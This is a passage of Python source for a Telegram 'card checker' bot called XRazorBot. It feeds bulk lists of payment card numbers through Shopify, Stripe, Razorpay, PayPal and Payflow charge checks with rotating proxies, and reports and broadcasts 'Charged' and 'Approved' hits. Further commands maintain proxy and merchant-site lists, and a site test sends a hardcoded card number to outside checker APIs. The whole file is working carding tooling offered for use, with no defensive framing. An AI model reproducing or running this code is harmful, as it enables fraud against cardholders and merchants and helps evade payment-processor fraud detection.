            current_proxies = load_proxies()
            if use_proxy and (not current_sites or not current_proxies):
                res = {'status': 'Dead', 'message': 'No sites or proxies available', 'card': card, 'gateway': 'shopiii', 'price': '-'}
            else:
                try:
                    if use_proxy:
                        site = random.choice(current_sites)
                        proxy = random.choice(current_proxies)
                        res = await check_card_shopify(card, site, proxy, use_proxy_api=True)
                    else:
                        res = await check_card_shopify(card, None, None, use_proxy_api=False, use_random_sites=True)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'Dead', 'message': f'API error: {str(e)}', 'card': card, 'gateway': 'shopiii', 'price': '-'}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res.get('gateway'):
                    results['last_gateway'] = res['gateway']
                if res['status'] == 'Charged':
                    results['charged'].append(res)
                    sender = await bot.get_entity(user_id)
                    user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
                    await broadcast_charged_hit(res, user_info)
                    await send_realtime_hit(user_id, res, 'Charged', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                elif res['status'] in ('Approved', '3DS_REQUIRED'):
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))
    await bot.delete_messages(chat_id, status_msg_id)
    await send_final_results(user_id, results, 'shopify')
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# Stripe Auth mass
async def start_stripe_mass(user_id, data, use_proxy, concurrency=4):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $tau | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: Stripe Auth\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline(f"Approved ↬ [0] ✅", b"mass_noop"), Button.inline(f"Declined ↬ [0] ❌", b"mass_noop")],
        [Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'last_gateway': 'Stripe Auth', 'command': '/tau'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy = None
            if use_proxy:
                proxies = load_proxies()
                if not proxies:
                    res = {'status': 'DECLINED', 'message': 'No proxies available', 'gateway': 'Stripe Auth', 'card': card}
                else:
                    proxy = random.choice(proxies)
                    try:
                        res = await check_stripe_auth_card(card, proxy)
                    except Exception as e:
                        await asyncio.sleep(ERROR_SLEEP_SECONDS)
                        res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Stripe Auth', 'card': card}
            else:
                try:
                    res = await check_stripe_auth_card(card)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Stripe Auth', 'card': card}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res['status'] == 'APPROVED':
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0), gateway_type='stripe')

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0), gateway_type='stripe')
    await bot.delete_messages(chat_id, status_msg_id)
    await send_stripe_auth_final_results(user_id, results)
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# Stripe $5 mass
async def start_mass_stripe5(user_id, data, use_proxy, concurrency=10):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $tst | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: Stripe $5\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline("Charged ↬ [0] 💎", b"mass_noop"), Button.inline("Approved ↬ [0] ✅", b"mass_noop")],
        [Button.inline("Declined ↬ [0] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'last_gateway': 'Stripe $5', 'command': '/tst'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy = None
            if use_proxy:
                proxies = load_proxies()
                if not proxies:
                    res = {'status': 'DECLINED', 'message': 'No proxies available', 'gateway': 'Stripe $5', 'price': '$5', 'card': card}
                else:
                    proxy = random.choice(proxies)
                    try:
                        res = await check_stripe5_card(card, proxy=proxy)
                    except Exception as e:
                        await asyncio.sleep(ERROR_SLEEP_SECONDS)
                        res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Stripe $5', 'price': '$5', 'card': card}
            else:
                try:
                    res = await check_stripe5_card(card, proxy=None)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Stripe $5', 'price': '$5', 'card': card}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res['status'] == 'CHARGED':
                    results['charged'].append(res)
                    sender = await bot.get_entity(user_id)
                    user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
                    await broadcast_charged_hit(res, user_info)
                    await send_realtime_hit(user_id, res, 'Charged', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                elif res['status'] == 'APPROVED':
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0), gateway_type='stripe5')

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0), gateway_type='stripe5')
    await bot.delete_messages(chat_id, status_msg_id)
    await send_stripe5_final_results(user_id, results)
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# Razorpay mass
async def start_mass_razorpay(user_id, data, use_proxy, concurrency=5):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $trz | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: Razorpay\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline("Charged ↬ [0] 💎", b"mass_noop"), Button.inline("Approved ↬ [0] ✅", b"mass_noop")],
        [Button.inline("Declined ↬ [0] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'last_gateway': 'Razorpay', 'command': '/trz'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy = None
            if use_proxy:
                proxies = load_proxies()
                if not proxies:
                    res = {'status': 'DECLINED', 'message': 'No proxies available', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': card}
                else:
                    proxy = random.choice(proxies)
                    try:
                        res = await check_razorpay_card(card, proxy=proxy)
                    except Exception as e:
                        await asyncio.sleep(ERROR_SLEEP_SECONDS)
                        res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': card}
            else:
                try:
                    res = await check_razorpay_card(card, proxy=None)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': card}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res['status'] == 'CHARGED':
                    results['charged'].append(res)
                    sender = await bot.get_entity(user_id)
                    user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
                    await broadcast_charged_hit(res, user_info)
                    await send_realtime_hit(user_id, res, 'Charged', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                elif res['status'] in ('APPROVED', '3DS_REQUIRED'):
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))
    await bot.delete_messages(chat_id, status_msg_id)
    await send_final_results(user_id, results, 'razorpay')
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# Payflow $18 mass
async def start_mass_payflow(user_id, data, use_proxy, concurrency=8):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $tpf | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: Payflow $18\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline("Charged ↬ [0] 💎", b"mass_noop"), Button.inline("Approved ↬ [0] ✅", b"mass_noop")],
        [Button.inline("Declined ↬ [0] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'last_gateway': 'Payflow $18', 'command': '/tpf'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy_dict = None
            if use_proxy:
                proxies = load_proxies()
                if not proxies:
                    res = {'status': 'DECLINED', 'message': 'No proxies available', 'gateway': 'Payflow $18', 'price': '$18', 'card': card}
                else:
                    proxy_str = random.choice(proxies)
                    proxy_dict = proxy_str_to_dict(proxy_str)
                    try:
                        res = await check_payflow_card(card, proxy=proxy_dict)
                    except Exception as e:
                        await asyncio.sleep(ERROR_SLEEP_SECONDS)
                        res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Payflow $18', 'price': '$18', 'card': card}
            else:
                try:
                    res = await check_payflow_card(card, proxy=None)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'Payflow $18', 'price': '$18', 'card': card}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res['status'] == 'CHARGED':
                    results['charged'].append(res)
                    sender = await bot.get_entity(user_id)
                    user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
                    await broadcast_charged_hit(res, user_info)
                    await send_realtime_hit(user_id, res, 'Charged', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                elif res['status'] == 'APPROVED':
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))
    await bot.delete_messages(chat_id, status_msg_id)
    await send_final_results(user_id, results, 'payflow')
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# PayPal $1 mass
async def start_mass_paypal(user_id, data, use_proxy, concurrency=12):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $mpp | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: PayPal $1\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline("Charged ↬ [0] 💎", b"mass_noop"), Button.inline("Approved ↬ [0] ✅", b"mass_noop")],
        [Button.inline("Declined ↬ [0] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'last_gateway': 'PayPal $1', 'command': '/mpp'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy_dict = None
            if use_proxy:
                proxies = load_proxies()
                if not proxies:
                    res = {'status': 'DECLINED', 'message': 'No proxies available', 'gateway': 'PayPal $1', 'price': '$1.00', 'card': card}
                else:
                    proxy_str = random.choice(proxies)
                    proxy_dict = proxy_str_to_dict(proxy_str)
                    try:
                        res = await check_paypal_card(card, proxy=proxy_dict)
                    except Exception as e:
                        await asyncio.sleep(ERROR_SLEEP_SECONDS)
                        res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'PayPal $1', 'price': '$1.00', 'card': card}
            else:
                try:
                    res = await check_paypal_card(card, proxy=None)
                except Exception as e:
                    await asyncio.sleep(ERROR_SLEEP_SECONDS)
                    res = {'status': 'DECLINED', 'message': f'Error: {str(e)}', 'gateway': 'PayPal $1', 'price': '$1.00', 'card': card}
            async with asyncio.Lock():
                results['checked'] = results.get('checked', 0) + 1
                results['last_card'] = {'card': card, 'message': res.get('message', 'Unknown error')}
                if res['status'] == 'CHARGED':
                    results['charged'].append(res)
                    sender = await bot.get_entity(user_id)
                    user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
                    await broadcast_charged_hit(res, user_info)
                    await send_realtime_hit(user_id, res, 'Charged', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                elif res['status'] == 'APPROVED':
                    results['approved'].append(res)
                    sender = await bot.get_entity(user_id)
                    await send_realtime_hit(user_id, res, 'Approved', sender.username or "", group_id=chat_id, reply_to=cmd_msg_id)
                else:
                    results['dead'].append(res)
            await asyncio.sleep(CARD_DELAY_SECONDS)
            nonlocal last_update
            if time.time() - last_update >= 1.0:
                last_update = time.time()
                if session_key in active_sessions:
                    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))

    workers = [asyncio.create_task(worker(i)) for i in range(concurrency)]
    while any(not w.done() for w in workers):
        if session_key not in active_sessions:
            for w in workers:
                w.cancel()
            break
        await asyncio.sleep(0.5)
    if session_key in active_sessions:
        del active_sessions[session_key]
    await update_progress(chat_id, status_msg_id, results, results.get('checked', 0))
    await bot.delete_messages(chat_id, status_msg_id)
    await send_final_results(user_id, results, 'paypal')
    if file_path and os.path.exists(file_path):
        os.remove(file_path)

# ========== PROXY AND SITE MANAGEMENT COMMANDS ==========
# /tap – add proxies from .txt file (alive check)
@bot.on(events.NewMessage(pattern='/tap'))
async def tap_proxy_command(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.is_group or event.is_channel:
        await event.reply(premium_emoji("⚠️ Proxies can only be added in <b>private chat</b> with the bot. Send the .txt file in DM and reply with /tap there."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing proxies (one per line).\nFormat: ip:port or ip:port:user:pass"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        proxies = [line.strip() for line in content.splitlines() if line.strip()]
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies found in file."), parse_mode='html')
            os.remove(file_path)
            return
        total = len(proxies)
        await status_msg.edit(premium_emoji(f"🔥 Checking {total} proxies..."), parse_mode='html')
        current = load_proxies()
        new_alive = []
        checked = 0
        alive_count = 0
        dead_count = 0
        for proxy in proxies:
            if proxy in current:
                dead_count += 1
                checked += 1
                await status_msg.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {checked}/{total}\n<b>Alive (new):</b> {len(new_alive)}\n<b>Dead/Duplicate:</b> {dead_count}"), parse_mode='html')
                continue
            is_alive = await test_proxy(proxy)
            if is_alive:
                new_alive.append(proxy)
                alive_count += 1
            else:
                dead_count += 1
            checked += 1
            await status_msg.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {checked}/{total}\n<b>Alive (new):</b> {len(new_alive)}\n<b>Dead/Duplicate:</b> {dead_count}"), parse_mode='html')
            await asyncio.sleep(0.5)
        if new_alive:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for p in new_alive:
                    await f.write(f"{p}\n")
        await status_msg.edit(premium_emoji(f"✅ <b>Proxy Addition Complete!</b>\n\n<b>Total in file:</b> {total}\n<b>New alive added:</b> {len(new_alive)}\n<b>Skipped (dead/duplicate):</b> {dead_count}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# /proxy – check all proxies, remove dead ones
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check_command(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
    alive = []
    dead = []
    total = len(proxies)
    for i, proxy in enumerate(proxies):
        if await test_proxy(proxy):
            alive.append(proxy)
        else:
            dead.append(proxy)
        await status_msg.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {i+1}/{total}\n<b>Alive:</b> {len(alive)}\n<b>Dead:</b> {len(dead)}"), parse_mode='html')
        await asyncio.sleep(0.3)
    save_proxies(alive)
    await status_msg.edit(premium_emoji(f"✅ **Proxy Check Complete!**\n\n**Total:** {total}\n**Alive:** {len(alive)}\n**Removed (dead):** {len(dead)}\n\n`proxy.txt` updated."), parse_mode='html')

# /fuck – check all sites, remove dead ones
async def test_site(site: str):
    """
    Check if a Shopify site is alive using proxyless APIs.
    Returns {'site': site, 'status': 'alive'} or {'site': site, 'status': 'dead'}.
    """
    test_card = "5154623245618097|03|2032|156"
    api_settings = load_api_settings()
    apis = api_settings.get('shopify_proxyless_apis', [PROXYLESS_API_1, PROXYLESS_API_2])

    for api_url in apis:
        try:
            if api_url == PROXYLESS_API_1:
                full_url = f"{api_url}?url={site}&cc={test_card}"
            else:
                full_url = f"{api_url}?cc={test_card}&site={site}"
            timeout = aiohttp.ClientTimeout(total=60)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(full_url) as resp:
                    if resp.status != 200:
                        continue
                    raw = await resp.json(content_type=None)
            response_msg = raw.get('Response', '')
            if is_dead_site_error(response_msg):
                return {'site': site, 'status': 'dead'}
            # If we get here, the API returned something that isn't a dead‑site error → site is alive
            return {'site': site, 'status': 'alive'}
        except Exception:
            continue
    # All APIs failed or all returned dead‑site errors
    return {'site': site, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/fuck'))
async def site_check_command(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    alive, dead = [], []
    batch_size = 10
    total = len(sites)
    for i in range(0, total, batch_size):
        batch = sites[i:i+batch_size]
        tasks = [test_site(site) for site in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive.append(res['site'])
            else:
                dead.append(res['site'])
        await status_msg.edit(premium_emoji(f"🔥 Checking sites...\n\n<b>Checked:</b> {min(i+batch_size, total)}/{total}\n<b>Alive:</b> {len(alive)}\n<b>Dead:</b> {len(dead)}"), parse_mode='html')
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in alive:
            await f.write(f"{site}\n")
    await status_msg.edit(premium_emoji(f"✅ **Site Check Complete!**\n\n**Total:** {len(sites)}\n**Alive:** {len(alive)}\n**Removed:** {len(dead)}\n\n`sites.txt` updated."), parse_mode='html')

# /addsite – add a single site (alive check)
@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def add_single_site(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/addsite https://site.com</code>"), parse_mode='html')
        return
    site_url = args[1].strip()
    if not (site_url.startswith('http://') or site_url.startswith('https://')):
        await event.reply(premium_emoji("❌ Invalid URL. Must start with http:// or https://"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔍 Checking site: <code>{site_url}</code>..."), parse_mode='html')
    try:
        result = await test_site(site_url)
        if result['status'] == 'alive':
            current_sites = load_sites()
            if site_url in current_sites:
                await status_msg.edit(premium_emoji(f"⚠️ Site already exists in `sites.txt`."), parse_mode='html')
                return
            async with aiofiles.open(SITES_FILE, 'a') as f:
                await f.write(f"{site_url}\n")
            await status_msg.edit(premium_emoji(f"✅ <b>Site Added Successfully!</b>\n\n<code>{site_url}</code> is alive and has been added to `sites.txt`."), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Site is DEAD!</b>\n\n<code>{site_url}</code> could not be used. Not added."), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking site: {e}"), parse_mode='html')

# /tas – add multiple sites from .txt file (alive check)
@bot.on(events.NewMessage(pattern='/tas'))
async def add_sites_from_txt(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing site URLs (one per line)."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
